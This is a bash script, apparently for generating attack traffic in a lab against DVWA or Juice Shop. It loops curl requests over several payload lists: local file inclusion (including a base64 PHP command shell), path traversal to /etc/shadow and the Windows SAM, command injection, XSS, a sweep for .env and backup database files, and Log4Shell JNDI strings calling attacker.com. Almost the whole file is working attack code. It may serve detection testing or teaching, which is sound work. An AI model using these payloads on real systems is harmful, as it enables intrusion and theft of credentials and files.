#!/bin/bash
###############################################################################
# WEB EXPLOITATION ATTACKS
# Common web vulnerabilities observed in production
# 
# Target: DVWA (10.10.40.10) or Juice Shop (10.10.40.10:3000)
###############################################################################

set -e

ATTACK_TYPE="${1:-lfi}"
TARGET="${2:-10.10.40.10}"
PORT="${3:-80}"
RESULTS_DIR="${4:-.}"

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

log() { echo -e "${GREEN}[$(date '+%H:%M:%S')]${NC} $1"; }

###############################################################################
# LOCAL FILE INCLUSION (LFI)
###############################################################################
lfi_attack() {
    log "Starting LFI attack..."
    
    # Common LFI payloads
    LFI_PAYLOADS=(
        "../../../etc/passwd"
        "....//....//....//etc/passwd"
        "..%2f..%2f..%2fetc/passwd"
        "..%252f..%252f..%252fetc/passwd"
        "/etc/passwd%00"
        "php://filter/convert.base64-encode/resource=/etc/passwd"
        "php://filter/read=string.rot13/resource=/etc/passwd"
        "file:///etc/passwd"
        "expect://id"
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
        "/proc/self/environ"
        "/var/log/apache2/access.log"
        "/var/log/apache2/error.log"
    )
    
    for payload in "${LFI_PAYLOADS[@]}"; do
        # Try multiple parameters
        for param in "page" "file" "include" "path" "doc" "document" "folder" "root" "pg"; do
            curl -s "http://${TARGET}:${PORT}/vulnerabilities/fi/?${param}=${payload}" \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
                -o /dev/null &
        done
        sleep 0.1
    done
    
    wait
    log "LFI attack complete"
}

###############################################################################
# PATH TRAVERSAL
###############################################################################
path_traversal() {
    log "Starting path traversal attack..."
    
    TRAVERSAL_PAYLOADS=(
        "../"
        "..%2f"
        "..%252f"
        "%2e%2e/"
        "%2e%2e%2f"
        "....//....//....//etc/passwd"
        "..\\..\\..\\windows\\system32\\config\\sam"
        "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"
    )
    
    SENSITIVE_FILES=(
        "etc/passwd"
        "etc/shadow"
        "etc/hosts"
        "windows/system32/config/sam"
        "windows/win.ini"
        "boot.ini"
        "wp-config.php"
        ".env"
        "config.php"
        "database.yml"
        ".git/config"
        ".htaccess"
        ".htpasswd"
    )
    
    for traversal in "${TRAVERSAL_PAYLOADS[@]}"; do
        for file in "${SENSITIVE_FILES[@]}"; do
            curl -s "http://${TARGET}:${PORT}/${traversal}${traversal}${traversal}${file}" \
                -o /dev/null &
        done
        sleep 0.05
    done
    
    wait
    log "Path traversal complete"
}

###############################################################################
# COMMAND INJECTION
###############################################################################
command_injection() {
    log "Starting command injection attack..."
    
    CMDI_PAYLOADS=(
        "; id"
        "| id"
        "|| id"
        "&& id"
        "\`id\`"
        "\$(id)"
        "; cat /etc/passwd"
        "| cat /etc/passwd"
        "; whoami"
        "| whoami"
        "; uname -a"
        "| uname -a"
        "; ls -la"
        "| ls -la"
        "\"; id; \""
        "'; id; '"
        "127.0.0.1; id"
        "127.0.0.1 | id"
        "127.0.0.1 && id"
        "127.0.0.1 || id"
        "127.0.0.1\nid"
        "127.0.0.1%0aid"
        "127.0.0.1%0did"
    )
    
    for payload in "${CMDI_PAYLOADS[@]}"; do
        # URL encode the payload
        encoded=$(echo -n "$payload" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))")
        
        curl -s "http://${TARGET}:${PORT}/vulnerabilities/exec/?ip=${encoded}&Submit=Submit" \
            -H "User-Agent: Mozilla/5.0" \
            -o /dev/null &
        sleep 0.1
    done
    
    wait
    log "Command injection complete"
}

###############################################################################
# XSS (Cross-Site Scripting)
###############################################################################
xss_attack() {
    log "Starting XSS attack..."
    
    XSS_PAYLOADS=(
        "<script>alert(1)</script>"
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert(1)>"
        "<svg onload=alert(1)>"
        "<body onload=alert(1)>"
        "javascript:alert(1)"
        "<iframe src='javascript:alert(1)'>"
        "<input onfocus=alert(1) autofocus>"
        "<marquee onstart=alert(1)>"
        "<details open ontoggle=alert(1)>"
        "'-alert(1)-'"
        "\"-alert(1)-\""
        "</script><script>alert(1)</script>"
        "<ScRiPt>alert(1)</ScRiPt>"
        "<scr<script>ipt>alert(1)</scr</script>ipt>"
        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
        "<IMG SRC=\"javascript:alert('XSS');\">"
        "<<SCRIPT>alert('XSS');//<</SCRIPT>"
    )
    
    for payload in "${XSS_PAYLOADS[@]}"; do
        encoded=$(echo -n "$payload" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))")
        
        # Try reflected XSS
        curl -s "http://${TARGET}:${PORT}/vulnerabilities/xss_r/?name=${encoded}" \
            -o /dev/null &
        
        # Try in different parameters
        curl -s "http://${TARGET}:${PORT}/?search=${encoded}" \
            -o /dev/null &
        curl -s "http://${TARGET}:${PORT}/?q=${encoded}" \
            -o /dev/null &
            
        sleep 0.1
    done
    
    wait
    log "XSS attack complete"
}

###############################################################################
# CONFIG FILE HUNTING
###############################################################################
config_hunting() {
    log "Starting config file hunting..."
    
    CONFIG_FILES=(
        ".env"
        ".env.local"
        ".env.production"
        ".env.backup"
        "wp-config.php"
        "wp-config.php.bak"
        "wp-config.php.old"
        "wp-config.php.save"
        "wp-config.php~"
        "wp-config.php.swp"
        ".wp-config.php.swp"
        "config.php"
        "config.php.bak"
        "configuration.php"
        "settings.php"
        "database.php"
        "db.php"
        "connect.php"
        "connection.php"
        ".git/config"
        ".git/HEAD"
        ".gitignore"
        ".svn/entries"
        ".DS_Store"
        "Thumbs.db"
        "composer.json"
        "package.json"
        ".htaccess"
        ".htpasswd"
        "web.config"
        "robots.txt"
        "sitemap.xml"
        "crossdomain.xml"
        "phpinfo.php"
        "info.php"
        "test.php"
        "debug.php"
        "backup.sql"
        "dump.sql"
        "database.sql"
        "db.sql"
        "backup.zip"
        "backup.tar.gz"
        "site.zip"
        "www.zip"
    )
    
    for file in "${CONFIG_FILES[@]}"; do
        curl -s -o /dev/null -w "%{http_code} " "http://${TARGET}:${PORT}/${file}" &
        sleep 0.05
    done
    
    wait
    echo ""
    log "Config hunting complete"
}

###############################################################################
# LOG4SHELL PROBES (Simulated)
###############################################################################
log4shell_probe() {
    log "Starting Log4Shell probe..."
    
    LOG4J_PAYLOADS=(
        '${jndi:ldap://attacker.com/a}'
        '${jndi:ldap://${env:USER}.attacker.com/a}'
        '${jndi:dns://attacker.com/a}'
        '${jndi:rmi://attacker.com/a}'
        '${${lower:j}ndi:${lower:l}dap://attacker.com/a}'
        '${${upper:j}ndi:${upper:l}dap://attacker.com/a}'
        '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}'
    )
    
    for payload in "${LOG4J_PAYLOADS[@]}"; do
        # Try in various headers
        curl -s "http://${TARGET}:${PORT}/" \
            -H "User-Agent: ${payload}" \
            -H "X-Forwarded-For: ${payload}" \
            -H "Referer: ${payload}" \
            -H "X-Api-Version: ${payload}" \
            -o /dev/null &
        sleep 0.1
    done
    
    wait
    log "Log4Shell probe complete"
}

###############################################################################
# MAIN
###############################################################################
case "$ATTACK_TYPE" in
    lfi)
        lfi_attack
        ;;
    path_traversal|traversal)
        path_traversal
        ;;
    cmdi|command_injection)
        command_injection
        ;;
    xss)
        xss_attack
        ;;
    config|config_hunt)
        config_hunting
        ;;
    log4shell|log4j)
        log4shell_probe
        ;;
    full)
        lfi_attack
        path_traversal
        command_injection
        xss_attack
        config_hunting
        log4shell_probe
        ;;
    *)
        echo "Unknown attack type: $ATTACK_TYPE"
        echo "Available: lfi, path_traversal, cmdi, xss, config, log4shell, full"
        exit 1
        ;;
esac

log "Web exploitation attacks complete"
